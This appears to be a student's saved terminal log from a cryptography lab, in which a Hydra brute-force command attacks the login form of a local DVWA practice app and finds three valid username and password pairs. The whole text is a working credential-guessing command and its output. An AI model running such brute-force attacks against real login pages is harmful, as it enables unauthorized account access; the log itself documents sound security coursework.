@@ -1,0 +1,64 @@
+lavapatos@debian:~/Documents/uCosasLocal/2026-2/Cripto/labs/lab2$ hydra -L evidencias/diccionarios/users_dvwa_5.txt -P evidencias/diccionarios/passwords_rockyou_10.txt 127.0.0.1 -s 6969 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=qiplsqh502ko6d0qlrc7n3jk23:F=Username and/or password incorrect" -V
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-18 23:42:54
+[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 50 login tries (l:5/p:10), ~4 tries per task
+[DATA] attacking http-get-form://127.0.0.1:6969/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=qiplsqh502ko6d0qlrc7n3jk23:F=Username and/or password incorrect
+[ATTEMPT] target 127.0.0.1 - login "1337" - pass "123456" - 1 of 50 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "1337" - pass "12345" - 2 of 50 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "1337" - pass "123456789" - 3 of 50 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "1337" - pass "password" - 4 of 50 [child 3] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "1337" - pass "iloveyou" - 5 of 50 [child 4] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "1337" - pass "princess" - 6 of 50 [child 5] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "1337" - pass "1234567" - 7 of 50 [child 6] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "1337" - pass "rockyou" - 8 of 50 [child 7] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "1337" - pass "12345678" - 9 of 50 [child 8] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "1337" - pass "abc123" - 10 of 50 [child 9] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "123456" - 11 of 50 [child 10] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "12345" - 12 of 50 [child 11] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "123456789" - 13 of 50 [child 12] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "password" - 14 of 50 [child 13] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "iloveyou" - 15 of 50 [child 14] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "princess" - 16 of 50 [child 15] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "1234567" - 17 of 50 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "rockyou" - 18 of 50 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "12345678" - 19 of 50 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "abc123" - 20 of 50 [child 3] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "123456" - 21 of 50 [child 4] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "12345" - 22 of 50 [child 5] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "123456789" - 23 of 50 [child 7] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "password" - 24 of 50 [child 6] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "iloveyou" - 25 of 50 [child 8] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "princess" - 26 of 50 [child 9] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "1234567" - 27 of 50 [child 10] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "rockyou" - 28 of 50 [child 11] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "12345678" - 29 of 50 [child 12] (0/0)
+[6969][http-get-form] host: 127.0.0.1   login: admin   password: password
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "abc123" - 30 of 50 [child 15] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "pablo" - pass "123456" - 31 of 50 [child 13] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "pablo" - pass "12345" - 32 of 50 [child 14] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "pablo" - pass "123456789" - 33 of 50 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "pablo" - pass "password" - 34 of 50 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "pablo" - pass "iloveyou" - 35 of 50 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "pablo" - pass "princess" - 36 of 50 [child 5] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "pablo" - pass "1234567" - 37 of 50 [child 3] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "pablo" - pass "rockyou" - 38 of 50 [child 4] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "pablo" - pass "12345678" - 39 of 50 [child 6] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "pablo" - pass "abc123" - 40 of 50 [child 7] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "smithy" - pass "123456" - 41 of 50 [child 8] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "smithy" - pass "12345" - 42 of 50 [child 9] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "smithy" - pass "123456789" - 43 of 50 [child 10] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "smithy" - pass "password" - 44 of 50 [child 11] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "smithy" - pass "iloveyou" - 45 of 50 [child 12] (0/0)
+[6969][http-get-form] host: 127.0.0.1   login: gordonb   password: abc123
+[ATTEMPT] target 127.0.0.1 - login "smithy" - pass "princess" - 46 of 50 [child 13] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "smithy" - pass "1234567" - 47 of 50 [child 14] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "smithy" - pass "rockyou" - 48 of 50 [child 15] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "smithy" - pass "12345678" - 49 of 50 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "smithy" - pass "abc123" - 50 of 50 [child 2] (0/0)
+[6969][http-get-form] host: 127.0.0.1   login: smithy   password: password
+1 of 1 target successfully completed, 3 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-18 23:42:55
+lavapatos@debian:~/Documents/uCosasLocal/2026-2/Cripto/labs/lab2$ 
+
